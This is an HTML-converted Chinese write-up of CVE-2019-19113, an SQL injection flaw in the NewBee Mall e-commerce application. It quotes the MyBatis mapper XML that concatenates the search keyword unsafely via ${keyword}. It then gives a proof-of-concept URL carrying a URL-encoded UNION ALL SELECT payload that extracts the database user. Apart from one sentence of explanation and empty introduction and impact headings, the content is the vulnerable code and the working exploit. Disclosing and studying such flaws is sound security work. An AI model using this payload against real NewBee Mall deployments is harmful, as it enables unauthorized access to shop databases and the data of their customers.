<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-19113）新蜂商城sql注入</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><h2>三、复现过程</h2><p>\src\main\resources\mapper\NewBeeMallGoodsMapper.xml</p><p>  &lt;select id="findNewBeeMallGoodsListBySearch" parameterType="Map" resultMap="BaseResultMap"&gt;<br />        select<br />        &lt;include refid="Base_Column_List"/&gt;<br />        from tb_newbee_mall_goods_info<br />        &lt;where&gt;<br />            &lt;if test=&quot;keyword!=null and keyword!=''&quot;&gt;<br />                and (goods_name like CONCAT('%','${keyword}','%') or goods_intro like CONCAT('%','${keyword}','%'))<br />            &lt;/if&gt;<br />            &lt;if test=&quot;goodsCategoryId!=null and goodsCategoryId!=''&quot;&gt;<br />                and goods_category_id = #{goodsCategoryId}<br />            &lt;/if&gt;<br />        &lt;/where&gt;<br />        &lt;if test=&quot;orderBy!=null and orderBy!=''&quot;&gt;<br />            &lt;choose&gt;<br />                &lt;when test=&quot;orderBy == 'new'&quot;&gt;<br />                    &lt;!-- 按照发布时间倒序排列 --&gt;<br />                    order by goods_id desc<br />                &lt;/when&gt;<br />                &lt;when test=&quot;orderBy == 'price'&quot;&gt;<br />                    &lt;!-- 按照售价从小到大排列 --&gt;<br />                    order by selling_price asc<br />                &lt;/when&gt;<br />                &lt;otherwise&gt;<br />                    &lt;!-- 默认按照库存数量从大到小排列 --&gt;<br />                    order by stock_num desc<br />                &lt;/otherwise&gt;<br />            &lt;/choose&gt;<br />        &lt;/if&gt;<br />        &lt;if test="start!=null and limit!=null"&gt;<br />            limit #{start},#{limit}<br />        &lt;/if&gt;<br />    &lt;/select&gt;</p><p>如果使用$ {keyword}拼接sql语句，则存在SQL注入的风险</p><p>poc：</p><p>http://0-sec.org:28089/search?goodsCategoryId=&amp;keyword=%5C%25%27%29%29%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%43%4F%4E%43%41%54%28%30%78%37%31%37%36%36%32%37%38%37%31%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%43%55%52%52%45%4E%54%5F%55%53%45%52%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%37%31%36%32%37%38%36%62%37%31%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%23&amp;orderBy=defaul</p></body></html>